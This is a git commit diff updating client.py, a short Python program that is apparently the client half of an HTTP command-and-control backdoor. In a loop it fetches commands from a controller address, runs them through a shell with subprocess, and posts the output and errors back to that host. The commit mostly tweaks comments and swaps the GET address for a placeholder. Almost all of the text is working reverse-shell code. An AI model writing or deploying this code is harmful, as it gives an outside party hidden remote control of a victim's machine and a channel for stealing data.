663360149dbb99564d6728ed232c000eca318b91
sympatiko04 <eddel.gauten@gmail.com>
2020-12-01 23:24:07 +1100

    Update client.py

--- client.py
+++ client.py
@@ -1,15 +1,14 @@
-#Basic HTTP client
+#HTTP client
 
-
-import requests     # Download Link    https://pypi.python.org/pypi/requests#downloads
+import requests
 import subprocess 
 import time
 
 
 while True: 
 
-    req = requests.get('http://192.168.0.17')      # Send GET request to the server
-    command = req.text                             # Store the received txt into command variable
+    req = requests.get('http://x.x.x.x')      # Send GET request to the server
+    command = req.text                        # Store the received txt into command variable
         
     if 'terminate' in command:
         break 
@@ -17,6 +16,6 @@ while True:
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         post_response = requests.post(url='http://192.168.0.17', data=CMD.stdout.read() )  # POST the result 
-        post_response = requests.post(url='http://192.168.0.17', data=CMD.stderr.read() )  # or the error -if any-
+        post_response = requests.post(url='http://192.168.0.17', data=CMD.stderr.read() )  # or any error
 
     time.sleep(3)
